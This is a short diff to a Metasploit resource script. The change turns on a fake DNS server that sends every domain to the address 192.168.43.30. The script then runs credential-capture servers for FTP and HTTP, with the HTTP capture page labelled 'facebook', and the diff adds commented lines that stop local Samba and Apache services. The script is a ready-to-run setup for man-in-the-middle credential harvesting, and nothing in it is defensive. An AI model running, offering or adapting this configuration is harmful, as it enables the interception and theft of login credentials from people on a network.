@@ -1,9 +1,12 @@
-#use auxiliary/server/fakedns
-#set SRVPORT 53
-#set TARGETACTION FAKE
-#set TARGETDOMAIN *
-#set TARGETHOST 192.168.43.30
-#run
+# service smbd stop
+# service apache2 stop
+
+use auxiliary/server/fakedns
+set SRVPORT 53
+set TARGETACTION FAKE
+set TARGETDOMAIN *
+set TARGETHOST 192.168.43.30
+run
 
 use auxiliary/server/capture/ftp
 run
@@ -36,5 +39,5 @@ use auxiliary/server/capture/http
 set AUTOPWN_HOST localhost
 set AUTOPWN_PORT 8081
 set AUTOPWN_URI facebook
-set SRVPORT 80
+set SRVPORT 8080
 run
